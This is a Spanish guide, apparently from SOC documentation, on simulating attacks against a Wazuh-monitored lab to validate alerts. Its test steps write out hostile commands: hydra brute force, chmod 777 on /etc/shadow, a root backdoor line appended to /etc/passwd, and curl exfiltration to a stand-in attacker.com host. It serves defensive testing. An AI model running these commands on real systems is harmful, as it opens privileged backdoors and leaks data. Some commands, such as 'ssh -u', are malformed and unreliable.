# 6. Pruebas y Simulación de Incidentes

## Introducción

Esta guía cubre la simulación de ataques controlados para validar que el SOC detecta y alerta correctamente sobre eventos de seguridad.

## Consideraciones Importantes

- **Entorno controlado**: Todas las pruebas en laboratorio aislado
- **Documentación**: Registrar cada prueba y resultado
- **Recuperación**: Tener plan de rollback tras cada simulación
- **Aprobación**: Solo realizar en entorno autorizado

## Test 1: Intentos de Acceso Fallidos (Fuerza Bruta)

### Escenario
Simular múltiples intentos fallidos de SSH para detectar fuerza bruta.

### Procedimiento
```bash
# En estación de ataque
for i in {1..10}; do
  ssh -u wronguser@target-server
  sleep 1
done

# Alternativa: usar herramienta
# hydra -l admin -P /usr/share/wordlists/rockyou.txt target-server ssh
```

### Validación
```bash
# En Wazuh Manager, buscar alertas
tail -f /var/ossec/logs/alerts/alerts.log | grep "Failed password"

# En Kibana
# Filtro: rule.id: "5711"
# Debe haber alert de "Multiple failed login attempts"
```

### Resultados Esperados
- Alerta generada después de 5 intentos fallidos en 5 minutos
- Email enviado a security-team
- Evento visible en Kibana
- Severity nivel 10 (High)

## Test 2: Modificación de Archivos Críticos

### Escenario
Modificar archivo crítico para detectar cambio de integridad.

### Procedimiento
```bash
# En servidor con agente
# Modificar archivo monitorizado
echo "unauthorized_change" >> /etc/hosts

# O en Windows
# echo "unauthorized_change" >> C:\Windows\System32\drivers\etc\hosts

# Esperar a próximo ciclo de FIM (normalmente 1 minuto)
sleep 60
```

### Validación
```bash
# Verificar alerta FIM en Manager
tail -f /var/ossec/logs/alerts/alerts.log | grep "FIM"

# En Kibana
# Filtro: rule.id: "6001" or rule.id: "6002"
```

### Resultados Esperados
- Alerta FIM generada
- Detalle del cambio visible (added, modified, deleted)
- Severity nivel 15 (Critical) para archivos /etc/passwd
- Hash del archivo registrado

## Test 3: Cambios en Permisos

### Escenario
Cambiar permisos en archivo crítico.

### Procedimiento
```bash
# En servidor Linux
chmod 777 /etc/shadow
chmod 777 /root/.ssh/authorized_keys

# En Windows, cambiar permisos de archivo del sistema
# (requiere herramientas especiales)
```

### Validación
```bash
# Verificar en logs
grep "Permissions:" /var/ossec/logs/alerts/alerts.log

# En Kibana, buscar cambios de permisos
```

### Resultados Esperados
- Alerta de cambio de permisos
- Permisos anteriores y nuevos registrados
- Usuario que realizó el cambio identificado

## Test 4: Instalación de Software Sospechoso

### Escenario
Instalar software y detectar cambio en paquetes del sistema.

### Procedimiento
```bash
# En servidor Linux
sudo apt-get install -y netcat-openbsd  # O herramienta sospechosa

# En Windows
# Instalar software desde PowerShell
```

### Validación
```bash
# Verificar en logs
grep "software" /var/ossec/logs/alerts/alerts.log

# En Kibana
# Filtro: rule.groups: "software_change"
```

### Resultados Esperados
- Instalación detectada
- Nombre del paquete registrado
- Versión del software
- Timestamp del evento

## Test 5: Detección de Rootkit

### Escenario
Ejecutar herramienta de detección de rootkit.

### Procedimiento
```bash
# En servidor con agente
# Rootcheck se ejecuta automáticamente, pero forzar:
/var/ossec/bin/wazuh-control query

# O crear archivo sospechoso
echo "#!/bin/bash" > /lib/modules/$(uname -r)/kernel/ubuntu/rootkit.ko
chmod +x /lib/modules/$(uname -r)/kernel/ubuntu/rootkit.ko
```

### Validación
```bash
# Verificar alertas de rootkit
grep "rootkit" /var/ossec/logs/alerts/alerts.log

# En Kibana
# Filtro: rule.id: "9003"
```

### Resultados Esperados
- Detección de rootkit alertada
- Severity crítico (15)
- Tipo de rootkit identificado

## Test 6: Actividad de Red Sospechosa

### Escenario
Simular tráfico de red sospechoso.

### Procedimiento
```bash
# Múltiples conexiones rechazadas por firewall
for i in {1..20}; do
  nc -zv target-server 9999 2>&1
  sleep 1
done

# O usar nmap para escaneo
nmap -sV target-server
```

### Validación
```bash
# Si usa Suricata o Snort:
# Verificar alertas de IDS

# Si solo monitoriza kernel:
grep "NEW_PORT" /var/ossec/logs/alerts/alerts.log
```

### Resultados Esperados
- Detección de escaneo de puertos
- IP de origen registrada
- Puertos escaneados
- Alert de correlación si múltiples intentos

## Test 7: Escenario Complejo - APT Simulado

### Descripción
Simular ataque APT (Advanced Persistent Threat) con múltiples fases.

### Fase 1: Reconocimiento
```bash
# Escaneo de red
nmap -p- target-server
```

### Fase 2: Explotación
```bash
# Intento de acceso fallido
ssh -u admin target-server
ssh -u root target-server
# (múltiples intentos)
```

### Fase 3: Acceso
```bash
# Login exitoso
ssh user@target-server
```

### Fase 4: Movimiento Lateral
```bash
# Cambio de usuario/privilegios
sudo su -
```

### Fase 5: Persistencia
```bash
# Crear backdoor
echo "backdoor_user:x:0:0::/root:/bin/bash" >> /etc/passwd

# O crear archivo sospechoso
touch /tmp/.suspicious_file
chmod 000 /tmp/.suspicious_file
```

### Fase 6: Exfiltración
```bash
# Conexión externa sospechosa
curl http://attacker.com/exfil?data=confidential
```

### Validación Completa
```bash
# Revisar timeline en Kibana
# Filtro temporal: últimas 2 horas
# Verificar eventos por fase:
# 1. Network scan alerts
# 2. Authentication failures
# 3. Successful login
# 4. Privilege escalation
# 5. File integrity changes
# 6. Suspicious network connections
```

### Resultados Esperados
- Todas las fases detectadas
- Timeline coherente en dashboard
- Correlación de eventos visible
- Alert crítico generado

## Matriz de Pruebas

| Test | Objetivo | Duración | Severidad Esperada | Estado |
|------|----------|----------|-------------------|--------|
| 1. Fuerza Bruta | Autenticación | 5 min | 10 (High) | |
| 2. Cambio de Archivo | Integridad | 2 min | 15 (Critical) | |
| 3. Cambio de Permisos | Escalación | 2 min | 12 (High) | |
| 4. Software Sospechoso | Sistema | 3 min | 5 (Medium) | |
| 5. Rootkit | Malware | 5 min | 15 (Critical) | |
| 6. Red Sospechosa | Red | 2 min | 10 (High) | |
| 7. APT Simulado | Integral | 10 min | 15 (Critical) | |

## Análisis de Resultados

### Métricas de Éxito
```
Detectabilidad = (Eventos Detectados / Total Eventos Simulados) × 100
Latencia = Tiempo entre evento real y alerta
Falsos Positivos = Alertas sin evento asociado
```

### Reporte de Test
Documentar:
1. Fecha y hora de ejecución
2. Escenario simulated
3. Eventos generados
4. Alertas detectadas
5. Falsos positivos
6. Recomendaciones de mejora

## Verificación Post-Test

### Limpieza
```bash
# Restaurar archivos modificados
sudo git checkout /etc/hosts

# Remover archivos sospechosos
sudo rm -f /tmp/.suspicious_file

# Remover usuarios de prueba
sudo userdel -r backdoor_user

# Reiniciar agente si es necesario
sudo systemctl restart wazuh-agent
```

### Validación
```bash
# Verificar que sistema está en estado normal
sudo systemctl status wazuh-agent
tail -f /var/ossec/logs/ossec.log

# Verificar conectividad a manager
/var/ossec/bin/agent_control -i <agent_id>
```

## Mejoras Basadas en Pruebas

### Ajustar Sensibilidad
Si hay muchos falsos positivos:
### Ajustar sensibilidad

(Eliminar/ajustar reglas de ejemplo según corresponda)

### Agregar Excepciones
### Crear Nuevas Reglas

(Definir reglas de detección según los eventos del laboratorio)
Si hay eventos no detectados, crear reglas específicas.

## Documentación de Incidente

Crear informe:
```markdown
# Reporte de Simulación de Incidente

## Información del Evento
- Fecha: 2025-01-15
- Tipo: Fuerza Bruta SSH
- Duración: 5 minutos
- Agente: linux-server-01

## Actividades Simuladas
1. 10 intentos de login con credenciales incorrectas
2. Desde IP: 192.168.1.50

## Detección
- Alertas generadas: 2 (fallos + correlación)
- Latencia: 30 segundos
- Severity: 10 (High)

## Respuesta
- Email enviado correctamente
- Visualización en Kibana
- Timeline mostró toda la actividad

## Conclusión
SOC funcionando correctamente
```

---

**Última actualización**: Mayo 2026
